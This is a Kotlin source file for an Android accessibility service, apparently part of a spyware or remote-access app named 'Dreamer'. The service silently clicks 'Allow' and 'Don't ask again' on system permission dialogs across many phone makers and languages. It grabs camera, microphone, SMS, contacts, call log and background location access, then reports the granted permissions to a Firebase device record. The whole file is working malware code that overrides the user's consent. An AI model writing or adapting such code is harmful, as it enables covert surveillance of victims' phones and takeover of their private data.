package com.h4k3r.dreamer

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.core.content.ContextCompat
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.*

class DreamerAccessibilityService : AccessibilityService() {
    companion object {
        private const val TAG = "DreamerAccessibility"
        var instance: DreamerAccessibilityService? = null

        // Permission dialog identifiers
        private val ALLOW_BUTTONS = listOf(
            "Allow", "ALLOW", "allow",
            "While using the app", "Only this time", "Always",
            "Grant", "OK", "Yes", "Continue",
            "允许", "确定", "授权", // Chinese
            "허용", "확인", // Korean
            "Permitir", "Aceptar", // Spanish
            "Autoriser", "Accepter", // French
            "अनुमति दें", "स्वीकार करें", // Hindi
            "Разрешить", "Принять" // Russian
        )

        private val PERMISSION_DIALOG_PACKAGES = listOf(
            "com.android.permissioncontroller",
            "com.google.android.permissioncontroller",
            "com.android.packageinstaller",
            "com.miui.securitycenter", // Xiaomi
            "com.coloros.safecenter", // Oppo
            "com.vivo.permissionmanager", // Vivo
            "com.huawei.systemmanager", // Huawei
            "com.samsung.android.permissioncontroller" // Samsung
        )
    }

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private var isAutoGranting = false
    private val pendingPermissions = mutableListOf<String>()
    private val handler = Handler(Looper.getMainLooper())

    // Broadcast receiver for commands
    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                "com.h4k3r.dreamer.GRANT_ALL_PERMISSIONS" -> {
                    autoGrantAllPermissions()
                }
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.d(TAG, "Accessibility service created")

        // Register command receiver
        val filter = IntentFilter("com.h4k3r.dreamer.GRANT_ALL_PERMISSIONS")
        registerReceiver(commandReceiver, filter)
    }

    override fun onServiceConnected() {
        super.onServiceConnected()

        // Configure service
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED

            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC

            flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS

            notificationTimeout = 100
        }

        serviceInfo = info
        Log.d(TAG, "Accessibility service connected")

        // Start auto-grant after a short delay
        handler.postDelayed({
            autoGrantAllPermissions()
        }, 2000)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (!isAutoGranting) return

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                handleWindowStateChanged(event)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                if (isPermissionDialog(event)) {
                    handlePermissionDialog()
                }
            }
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        scope.cancel()
        try {
            unregisterReceiver(commandReceiver)
        } catch (e: Exception) {
            Log.e(TAG, "Error unregistering receiver", e)
        }
    }

    /* ── Auto-Grant Process ──────────────────────────── */
    fun autoGrantAllPermissions() {
        Log.d(TAG, "Starting auto-grant process")
        isAutoGranting = true

        scope.launch {
            // Get all runtime permissions
            val permissions = getAllRuntimePermissions()

            // Check which ones need granting
            val missingPermissions = permissions.filter { permission ->
                ContextCompat.checkSelfPermission(this@DreamerAccessibilityService, permission) != PackageManager.PERMISSION_GRANTED
            }

            if (missingPermissions.isEmpty()) {
                Log.d(TAG, "All permissions already granted")
                isAutoGranting = false
                return@launch
            }

            Log.d(TAG, "Missing permissions: ${missingPermissions.size}")
            pendingPermissions.clear()
            pendingPermissions.addAll(missingPermissions)

            // Trigger permission requests through PermissionHelperActivity
            for (permission in missingPermissions) {
                requestPermissionViaActivity(permission)
                delay(1500) // Wait between requests
            }

            // Keep monitoring for dialogs
            handler.postDelayed({
                if (pendingPermissions.isNotEmpty()) {
                    Log.d(TAG, "Still ${pendingPermissions.size} permissions pending")
                }
                isAutoGranting = false
            }, 30000) // Stop after 30 seconds
        }
    }

    private fun requestPermissionViaActivity(permission: String) {
        val intent = Intent(this, PermissionHelperActivity::class.java).apply {
            putExtra("runtime_permission", permission)
            putExtra("permission", getPermissionName(permission))
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        startActivity(intent)
    }

    /* ── Permission Dialog Handling ────────────────────── */
    private fun handleWindowStateChanged(event: AccessibilityEvent) {
        val className = event.className?.toString() ?: return
        val packageName = event.packageName?.toString() ?: return

        Log.d(TAG, "Window changed - Package: $packageName, Class: $className")

        // Check if it's a permission dialog
        if (isPermissionDialog(packageName, className)) {
            handler.postDelayed({
                handlePermissionDialog()
            }, 500)
        }
    }

    private fun isPermissionDialog(event: AccessibilityEvent): Boolean {
        val packageName = event.packageName?.toString() ?: return false
        return PERMISSION_DIALOG_PACKAGES.contains(packageName)
    }

    private fun isPermissionDialog(packageName: String, className: String): Boolean {
        return PERMISSION_DIALOG_PACKAGES.contains(packageName) ||
                className.contains("GrantPermissionsActivity") ||
                className.contains("PermissionActivity") ||
                className.contains("RequestPermissionActivity")
    }

    private fun handlePermissionDialog() {
        val rootNode = rootInActiveWindow ?: return

        Log.d(TAG, "Searching for permission dialog buttons...")

        // Strategy 1: Click any "Don't ask again" checkbox first
        findAndClickNode(rootNode, "Don't ask again", nodeType = "CheckBox")
        findAndClickNode(rootNode, "不再询问", nodeType = "CheckBox") // Chinese

        // Strategy 2: Look for allow buttons by text
        for (allowText in ALLOW_BUTTONS) {
            if (findAndClickNode(rootNode, allowText, nodeType = "Button")) {
                Log.d(TAG, "Clicked allow button: $allowText")
                pendingPermissions.removeFirstOrNull()
                return
            }
        }

        // Strategy 3: Try clicking by resource ID
        val possibleIds = listOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_always_button",
            "com.android.packageinstaller:id/permission_allow_button",
            "android:id/button1", // Generic OK button
            "com.google.android.permissioncontroller:id/permission_allow_button",
            // MIUI specific
            "com.lbe.security.miui:id/permission_allow_button",
            // ColorOS specific
            "com.coloros.safecenter:id/et_loginpwd",
            // Vivo specific
            "com.vivo.permissionmanager:id/permission_allow_button"
        )

        for (id in possibleIds) {
            if (clickNodeById(rootNode, id)) {
                Log.d(TAG, "Clicked button by ID: $id")
                pendingPermissions.removeFirstOrNull()
                return
            }
        }

        // Strategy 4: Click the most positive-looking button
        clickMostPositiveButton(rootNode)
    }

    /* ── Node Finding and Clicking ─────────────────────── */
    private fun findAndClickNode(
        node: AccessibilityNodeInfo,
        text: String,
        nodeType: String? = null,
        exactMatch: Boolean = false
    ): Boolean {
        // Check current node
        val nodeText = node.text?.toString()
        val nodeClassName = node.className?.toString()

        // FIXED: Proper conditional logic for text matching
        val textMatches = if (exactMatch) {
            nodeText == text
        } else {
            nodeText?.contains(text, ignoreCase = true) == true
        }

        val typeMatches = nodeType == null ||
                nodeClassName?.contains(nodeType, ignoreCase = true) == true

        if (textMatches && typeMatches) {
            if (node.isClickable) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            } else {
                // Try clicking parent
                var parent = node.parent
                while (parent != null) {
                    if (parent.isClickable) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                        parent.recycle()
                        return true
                    }
                    val temp = parent
                    parent = parent.parent
                    temp.recycle()
                }
            }
        }

        // Check children
        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (findAndClickNode(child, text, nodeType, exactMatch)) {
                child.recycle()
                return true
            }
            child.recycle()
        }

        return false
    }

    private fun clickNodeById(node: AccessibilityNodeInfo, resourceId: String): Boolean {
        val foundNodes = node.findAccessibilityNodeInfosByViewId(resourceId)

        for (foundNode in foundNodes) {
            if (foundNode.isEnabled) {
                if (foundNode.isClickable) {
                    foundNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                    foundNode.recycle()
                    return true
                } else {
                    // Try parent
                    var parent = foundNode.parent
                    while (parent != null) {
                        if (parent.isClickable) {
                            parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                            parent.recycle()
                            foundNode.recycle()
                            return true
                        }
                        val temp = parent
                        parent = parent.parent
                        temp.recycle()
                    }
                }
            }
            foundNode.recycle()
        }

        return false
    }

    private fun clickMostPositiveButton(rootNode: AccessibilityNodeInfo) {
        val buttons = mutableListOf<AccessibilityNodeInfo>()
        findAllButtons(rootNode, buttons)

        // Score buttons based on their text
        val scoredButtons = buttons.mapNotNull { button ->
            val text = button.text?.toString() ?: return@mapNotNull null
            val score = getButtonScore(text)
            if (score > 0) Pair(button, score) else null
        }.sortedByDescending { it.second }

        // Click the highest scored button
        scoredButtons.firstOrNull()?.let { (button, score) ->
            Log.d(TAG, "Clicking positive button: ${button.text} (score: $score)")
            if (button.isClickable) {
                button.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }
        }

        // Recycle all buttons
        buttons.forEach { it.recycle() }
    }

    private fun findAllButtons(node: AccessibilityNodeInfo, buttons: MutableList<AccessibilityNodeInfo>) {
        if (node.className?.toString()?.contains("Button") == true) {
            buttons.add(AccessibilityNodeInfo.obtain(node))
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            findAllButtons(child, buttons)
            child.recycle()
        }
    }

    private fun getButtonScore(text: String): Int {
        val lowerText = text.lowercase()
        return when {
            lowerText in listOf("allow", "grant", "yes", "ok", "accept", "continue", "always") -> 10
            lowerText.contains("allow") || lowerText.contains("grant") -> 8
            lowerText.contains("while using") || lowerText.contains("only this time") -> 7
            lowerText in listOf("deny", "cancel", "no", "reject", "block") -> -10
            else -> 0
        }
    }

    /* ── Permission List Management ─────────────────────── */
    private fun getAllRuntimePermissions(): List<String> {
        val permissions = mutableListOf(
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_CALENDAR
        )

        if (Build.VERSION.SDK_INT >= 33) {
            permissions.addAll(listOf(
                android.Manifest.permission.READ_MEDIA_IMAGES,
                android.Manifest.permission.READ_MEDIA_VIDEO,
                android.Manifest.permission.READ_MEDIA_AUDIO,
                android.Manifest.permission.POST_NOTIFICATIONS
            ))
        } else if (Build.VERSION.SDK_INT >= 29) {
            permissions.addAll(listOf(
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.ACCESS_BACKGROUND_LOCATION
            ))
        } else {
            permissions.addAll(listOf(
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
            ))
        }

        return permissions
    }

    private fun getPermissionName(permission: String): String {
        return permission.substringAfterLast(".")
            .replace("_", " ")
            .lowercase()
            .replaceFirstChar { it.uppercase() }
    }

    /* ── Special Permissions for Android 13+ ─────────────── */
    fun grantBackgroundLocationIfNeeded() {
        if (Build.VERSION.SDK_INT >= 29) {
            scope.launch {
                delay(2000)
                val intent = Intent(this@DreamerAccessibilityService, PermissionHelperActivity::class.java).apply {
                    putExtra("runtime_permission", android.Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    putExtra("permission", "background_location")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                startActivity(intent)
            }
        }
    }

    /* ── Status Reporting ──────────────────────────────── */
    fun reportPermissionStatus() {
        scope.launch {
            val allPermissions = getAllRuntimePermissions()
            val grantedCount = allPermissions.count { permission ->
                ContextCompat.checkSelfPermission(this@DreamerAccessibilityService, permission) ==
                        PackageManager.PERMISSION_GRANTED
            }

            Log.d(TAG, "Permission status: $grantedCount/${allPermissions.size} granted")

            // Update Firebase
            updateFirebasePermissionStatus(grantedCount, allPermissions.size)
        }
    }

    private fun updateFirebasePermissionStatus(granted: Int, total: Int) {
        try {
            val prefs = getSharedPreferences("dreamer_auth", MODE_PRIVATE)
            val secretKey = prefs.getString("secret_key", null)
            val deviceId = prefs.getString("device_id", null)

            if (secretKey != null && deviceId != null) {
                Firebase.database.reference
                    .child("devices")
                    .child(secretKey)
                    .child(deviceId)
                    .child("info")
                    .child("permission_status")
                    .setValue(mapOf(
                        "granted" to granted,
                        "total" to total,
                        "percentage" to (granted * 100 / total),
                        "timestamp" to System.currentTimeMillis()
                    ))
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update Firebase", e)
        }
    }
}